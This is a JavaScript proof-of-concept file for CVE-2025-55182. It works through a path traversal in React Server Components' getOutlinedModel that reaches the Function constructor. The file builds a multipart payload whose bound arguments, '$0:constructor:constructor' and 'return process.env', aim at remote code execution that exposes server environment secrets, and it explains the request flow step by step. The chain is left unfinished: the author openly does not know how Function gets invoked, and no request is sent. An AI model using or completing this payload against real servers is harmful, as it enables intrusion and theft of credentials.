/**
 * CVE-2025-55182 - HTTP Exploit PoC
 *
 * The attack exploits path traversal in getOutlinedModel() to reach
 * the Function constructor.
 *
 * HTTP Request Format:
 * - FormData with multiple fields
 * - One field to set up a chunk with an object
 * - Another field with $-reference that traverses constructor.constructor
 */

const http = require('http');

console.log("=== CVE-2025-55182 HTTP Exploit PoC ===\n");

// Understanding the request format:
//
// The server expects FormData with fields like:
// - $ACTION_ID_<actionId> - Direct action call
// - $ACTION_REF_<n> - Reference to bound action
// - $ACTION_<n>:<key> - Bound action data
// - <prefix><chunkId> - Chunk data
//
// resolveField() processes fields with the prefix and calls resolveModelChunk()

console.log("=== Request Flow ===");
console.log(`
1. Client sends multipart/form-data POST to server action endpoint

2. Fields are processed:
   - Fields starting with prefix: resolveField() -> resolveModelChunk()
   - Other fields: stored in FormData

3. resolveModelChunk() parses the value as JSON and calls reviveModel()

4. reviveModel() processes strings starting with $:
   - $@<id> - chunk reference
   - $F<ref> - server function reference
   - $<ref> - outlined model reference (path traversal!)

5. getOutlinedModel() splits reference by ":" and traverses properties

6. With reference = "0:constructor:constructor", we reach Function!
`);

// Build the exploit request
async function exploit(target) {
  const boundary = "----WebKitFormBoundary" + Math.random().toString(36).substr(2);

  // We need to:
  // 1. Set up chunk 0 with any object
  // 2. Reference it with path traversal to get Function
  // 3. Have that Function be called with our code

  // The trick: In the bound args, include a $-reference that resolves to Function
  // Then the action receives Function as an argument

  // But we also need the action to CALL that argument...
  // Unless we can make the path traversal result BE the action itself!

  // Actually, let's check if $F with path traversal works differently
  // $F<ref> calls getOutlinedModel then loadServerReference$1 with result.id

  // What if we send a chunk that is already the Function?
  // chunk 0 = Function  (not possible via JSON)

  // What about using the path traversal in the action ID itself?
  // resolveServerReference does bundlerConfig[id] which could also traverse...

  console.log("=== Building Exploit Payload ===\n");

  // The most promising attack:
  // 1. Chunk 0: { "id": "validAction#constructor", "bound": [...] }
  // 2. $F0 references chunk 0
  // 3. loadServerReference$1 uses chunk.id = "validAction#constructor"
  // 4. resolveServerReference parses this, accesses moduleExports["constructor"]
  //
  // But this only gives Object, not Function!

  // For Function, we need constructor.constructor
  // The only way is path traversal: "0:constructor:constructor"

  // BUT: This returns Function itself, which doesn't have .id/.bound
  // So $F0:constructor:constructor would fail!

  // The REAL attack must use a different entry point...
  // Maybe the $ fallback case at line 4966-4967?

  console.log("Payload strategy:");
  console.log("1. Use the $ fallback case (not $F, $@, etc.)");
  console.log("2. Send $0:constructor:constructor in bound args");
  console.log("3. reviveModel parses this as a reference");
  console.log("4. getOutlinedModel traverses to Function");
  console.log("5. Function is stored in bound args");
  console.log("6. Action receives Function as argument!");

  // The HTTP request would be:
  const payload = {
    // Set up chunk 0 with any object (just so it exists)
    "0": JSON.stringify({ dummy: "data" }),

    // Action reference with bound args containing the path traversal
    "$ACTION_REF_0": "",
    "$ACTION_0:0": JSON.stringify({
      id: "validActionId",  // Must be valid
      bound: ["$0:constructor:constructor", "return process.env"]  // PATH TRAVERSAL IN BOUND!
    })
  };

  console.log("\nPayload fields:");
  for (const [key, value] of Object.entries(payload)) {
    console.log(`  ${key}: ${value}`);
  }

  console.log("\n=== What Happens ===");
  console.log(`
1. "$ACTION_0:0" is parsed:
   - id: "validActionId" -> resolves to a real action
   - bound: ["$0:constructor:constructor", "return process.env"]

2. bound is parsed by reviveModel:
   - "$0:constructor:constructor" hits the $ fallback case
   - getOutlinedModel("0:constructor:constructor") is called
   - Returns Function!

3. Action is loaded with bound args:
   - fn.bind.apply(fn, [null, Function, "return process.env"])

4. Action is called with:
   - arg0 = Function
   - arg1 = "return process.env"

5. If action does callback(code) pattern:
   - Function("return process.env")() = RCE!

But this still requires a specific action pattern...
`);

  console.log("\n=== Alternative: Direct Function Call ===");
  console.log(`
What if the path traversal result is used in a context where it's called?

Looking at createModelResolver line 4580-4582:
  for (var i = 1; i < path.length; i++) value = value[path[i]];
  parentObject[key] = map(response, value);

The 'map' function is called with the traversed value.
For server functions, map = createModel which just returns it.

But for $F case, map is the identity, then loadServerReference$1 is called.
loadServerReference$1 does requireModule(serverReference) which is then bound and called!

If we could make requireModule RETURN the Function constructor...
That would require a module that exports Function!

Wait - what if we use path traversal to make bundlerConfig[id] return
an object with .id pointing to a chunk that contains Function?

The more I analyze, the more I think the real exploit uses a specific
chain that results in Function being INVOKED, not just accessed.

The hasOwnProperty fix blocks moduleExports["constructor"].
The __proto__ fix in reviveModel blocks prototype pollution.
But the path traversal in getOutlinedModel allows reaching Function!

The question remains: HOW is Function invoked once accessed?
`);
}

exploit();
